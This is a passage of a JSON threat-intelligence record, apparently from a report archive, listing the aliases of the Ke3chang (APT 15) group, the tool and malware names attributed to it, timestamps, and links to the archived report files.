            "source_name": "Secureworks:BRONZE PALACE",
            "tools": [
                " BS2005",
                " Enfal",
                " Mirage",
                " RoyalCLI",
                " RoyalDNS",
                "BMW"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "17b1b76b-16da-4c4f-8b32-f6fede3eda8c",
            "created_at": "2022-10-25T16:07:23.750796Z",
            "updated_at": "2025-03-27T02:02:09.961401Z",
            "deleted_at": null,
            "main_name": "Ke3chang",
            "aliases": [
                "APT 15",
                "BackdoorDiplomacy",
                "Bronze Davenport",
                "Bronze Idlewood",
                "Bronze Palace",
                "CTG-9246",
                "GREF",
                "Ke3chang",
                "Metushy",
                "Nylon Typhoon",
                "Operation Ke3chang",
                "Operation MirageFox",
                "Playful Dragon",
                "Playful Taurus",
                "Red Vulture",
                "Royal APT",
                "Social Network Team",
                "Vixen Panda"
            ],
            "source_name": "ETDA:Ke3chang",
            "tools": [
                "Agentemis",
                "Anserin",
                "BS2005",
                "BleDoor",
                "CarbonSteal",
                "Cobalt Strike",
                "CobaltStrike",
                "DarthPusher",
                "DoubleAgent",
                "EternalBlue",
                "GoldenEagle",
                "Graphican",
                "HenBox",
                "HighNoon",
                "IRAFAU",
                "Ketrican",
                "Ketrum",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "MS Exchange Tool",
                "Mebroot",
                "Mimikatz",
                "MirageFox",
                "NBTscan",
                "Okrum",
                "PluginPhantom",
                "PortQry",
                "ProcDump",
                "PsList",
                "Quarian",
                "RbDoor",
                "RibDoor",
                "Royal DNS",
                "RoyalCli",
                "RoyalDNS",
                "SAMRID",
                "SMBTouch",
                "SilkBean",
                "Sinowal",
                "SpyWaller",
                "Theola",
                "TidePool",
                "Torpig",
                "Turian",
                "Winnti",
                "XSLCmd",
                "cobeacon",
                "nbtscan",
                "netcat",
                "spwebmember"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535857,
    "ts_updated_at": 1743041810,
    "ts_creation_date": 1319026341,
    "ts_modification_date": 1319026362,
    "files": {
        "pdf": "https://archive.orkl.eu/4dd11662db54850675fed5f33428b5b4b75d9bab.pdf",
        "text": "https://archive.orkl.eu/4dd11662db54850675fed5f33428b5b4b75d9bab.txt",
        "img": "https://archive.orkl.eu/4dd11662db54850675fed5f33428b5b4b75d9bab.jpg"
    }
}